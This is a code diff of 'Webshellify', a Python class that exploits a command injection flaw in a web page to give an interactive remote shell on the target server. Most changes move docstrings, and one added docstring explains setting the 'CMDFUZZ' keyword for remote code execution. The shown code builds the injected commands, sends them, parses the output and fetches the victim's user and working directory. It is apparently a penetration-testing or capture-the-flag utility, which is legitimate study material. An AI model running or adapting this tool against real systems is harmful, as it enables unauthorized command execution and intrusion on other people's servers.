@@ -1,14 +1,3 @@
-"""
-Webshellify is a python3 class that attempts to improve the reverse shell
-experience.
-
-The necessary request information should be specified or any functions that
-fetch necessary values from the server may be passed in as well.
-
-The location to specify where the command would be is specified by adding the
-string "CMDFUZZ" in either the request body or request query. This fuzzing string
-can be altered if necessary.
-"""
 from colorama import Back, Fore, Style
 import getch
 import re
@@ -16,20 +5,31 @@ import requests as req
 import sys
 
 class Webshellify:
+    """
+    Webshellify is a python3 class that attempts to improve the reverse shell
+    experience.
+
+    The necessary request information should be specified or any functions that
+    fetch necessary values from the server may be passed in as well.
+
+    The location to specify where the command would be is specified by adding the
+    string "CMDFUZZ" in either the request body or request query. This fuzzing string
+    can be altered if necessary.
+    """
     content_types = [
         "text/plain",
         "application/x-www-form-urlencoded"
     ]
-    """
-    Usage:
-    If the vulnerable webpage is at http://localhost/vuln/path, then the correct
-    initialization for a Webshellify instance would be:
-    `wshell = Webshellify("localhost", "/vuln/path", [options])`
-
-    options then include:
-    - debug: (boolean) Enable debugging messages, false by default
-    """
     def __init__(self, host, path, debug=False, **args):
+        """
+        Usage:
+        If the vulnerable webpage is at http://localhost/vuln/path, then the correct
+        initialization for a Webshellify instance would be:
+        `wshell = Webshellify("localhost", "/vuln/path", [options])`
+
+        options then include:
+        - debug: (boolean) Enable debugging messages, false by default
+        """
         # store necessary information that will improve the webshell
         self.workdir = "/"
         self.parentdir = "/"
@@ -63,14 +63,14 @@ class Webshellify:
         self.queries = {}
         self.cmd_fuzz = "CMDFUZZ"
 
-    """
-    Generates the given command into a form that can be easily extracted from
-    the response.
-
-    This command may contain additional command calls to determine additional
-    information of the current user and machine name
-    """
     def __gen_command(self, command, chdir=False):
+        """
+        Generates the given command into a form that can be easily extracted from
+        the response.
+
+        This command may contain additional command calls to determine additional
+        information of the current user and machine name
+        """
         commands = ""
         if(chdir):
             commands += f"cd {self.workdir};"
@@ -79,15 +79,15 @@ class Webshellify:
         commands += f"echo '`{self.delimiter}-wd`'; pwd; echo '`/{self.delimiter}-wd`'"
         return commands
 
-    """
-    Extracts the output from the command call from the page results
-
-    this will return the current user, working directory and command
-    response.
-
-    usage: user, wd, output = self.__extract_output(raw)
-    """
     def __extract_output(self, raw):
+        """
+        Extracts the output from the command call from the page results
+
+        this will return the current user, working directory and command
+        response.
+
+        usage: user, wd, output = self.__extract_output(raw)
+        """
         # if(self.debug):
         #     print(f"[debug] in funct `__extract_output`:\nraw: {raw}")
 
@@ -108,22 +108,22 @@ match: {output_re.findall(raw)}""")
         output = output_re.findall(raw)[0][0][:-1]
         return workdir, output
 
-    """
-    Sends an individual command in isolation to the host and path initialized.
-
-    This requires a preset location for the command to be inserted into the
-    request. This requires the command fuzz keyword to be placed in either a
-    query paramter or the request body
-
-    parameters
-    ----------
-    command: (string) - The command to execute at the victim's machine
-    chdir: (boolean, optional) - Indicates whether the directory should be changed.
-
-    This function will also return the name of the host, name of the current
-    user and the output of the previous command
-    """
     def send_command(self, command, chdir=False):
+        """
+        Sends an individual command in isolation to the host and path initialized.
+
+        This requires a preset location for the command to be inserted into the
+        request. This requires the command fuzz keyword to be placed in either a
+        query paramter or the request body
+
+        parameters
+        ----------
+        command: (string) - The command to execute at the victim's machine
+        chdir: (boolean, optional) - Indicates whether the directory should be changed.
+
+        This function will also return the name of the host, name of the current
+        user and the output of the previous command
+        """
         cmd = self.__gen_command(command, chdir=chdir)
         # generate query
         query_str = "?"
@@ -173,26 +173,26 @@ headers: {self.headers}
 
         return self.__extract_output(resp.text)
 
-    """
-    Reads the current working directory and returns the parent directory
-    relative to it
-
-    parameters
-    ----------
-    workdir: (string) the current working directory
-
-    returns the parent directory
-    """
     def __get_parent_dir(self, workdir):
+        """
+        Reads the current working directory and returns the parent directory
+        relative to it
+
+        parameters
+        ----------
+        workdir: (string) the current working directory
+
+        returns the parent directory
+        """
         # currently assuming a Linux machine, so paths are delimited by '/'
         path_parts = workdir.split('/')
         return '/'.join(path_parts[0:-1])
 
-    """
-    Fetches information of the user and the initial working directory upon an
-    initial load of an interactive shell
-    """
     def __get_init_info(self):
+        """
+        Fetches information of the user and the initial working directory upon an
+        initial load of an interactive shell
+        """
         try:
             workdir, whoami = self.send_command("whoami")
             self.workdir = workdir
@@ -207,11 +207,21 @@ headers: {self.headers}
             self.parentdir = self.__get_parent_dir(self.workdir)
             self.user = "?"
 
-    """
-    Creates an interactive shell that connects to the hostname and path as
-    specified during initialization.
-    """
     def create_shell(self):
+        """
+        Creates an interactive shell that connects to the hostname and path as
+        specified during initialization.
+
+        To properly emulate a shell and inject commands, a location to insert
+        commands into the request must be specified using the command fuzzing
+        keyword, `self.cmd_fuzz`, which is "CMDFUZZ" by default.
+
+        Setters may be used to specify a cookie, request parameter or request
+        body that contains this fuzzing keyword. The string must then be in the
+        format for the command injection to be successful. Along with this, any
+        additional request information to properly perform the remote code
+        execution must also be specified.
+        """
         input_handler = _input_str()
         self.__get_init_info()
         # capture KeyboardInterrupts
@@ -274,26 +284,26 @@ headers: {self.headers}
     def set_fuzz_word(self, fuzz):
         self.cmd_fuzz = fuzz
 
-    """
-    Changes the delimiter that isolates the program's output
-
-    This should be used if the server outputs data that matches the form of the
-    current delimiter
-    """
     def set_delimiter(self, delimiter):
+        """
+        Changes the delimiter that isolates the program's output
+
+        This should be used if the server outputs data that matches the form of the
+        current delimiter
+        """
         self.delimiter = delimiter
-"""
-Attempts to improve the text input function that can be used in comparison to
-Python's built-in input function
-"""
 class _input_str:
+    """
+    Attempts to improve the text input function that can be used in comparison to
+    Python's built-in input function
+    """
     def __init__(self):
         self.history = []
 
-    """
-    Updates the input prompt with the provided information
-    """
     def __print_input(self, print_str, input_str, cursor_pos):
+        """
+        Updates the input prompt with the provided information
+        """
         input_length = len(input_str) - 1
         str_len = len(print_str) + len(input_str)
         sys.stdout.write('\r' +
@@ -306,21 +316,21 @@ class _input_str:
                 )
         sys.stdout.flush()
 
-    """
-    Attempts to be an improved version of Python's input function
-
-    parameters
-    ----------
-    print_str: (string) The string to print as a prompt for the input
-
-    this input function currently supports:
-    - arrow key cursor movement (left and right)
-    - arrow key history traversal (up and down)
-    - character deletion (del, backspace)
-    - home and end key cursor movement
-    - general character input
-    """
     def input(self, print_str):
+        """
+        Attempts to be an improved version of Python's input function
+
+        parameters
+        ----------
+        print_str: (string) The string to print as a prompt for the input
+
+        this input function currently supports:
+        - arrow key cursor movement (left and right)
+        - arrow key history traversal (up and down)
+        - character deletion (del, backspace)
+        - home and end key cursor movement
+        - general character input
+        """
         input_str = [' ']
         cursor_pos = 0
         input_length = 0
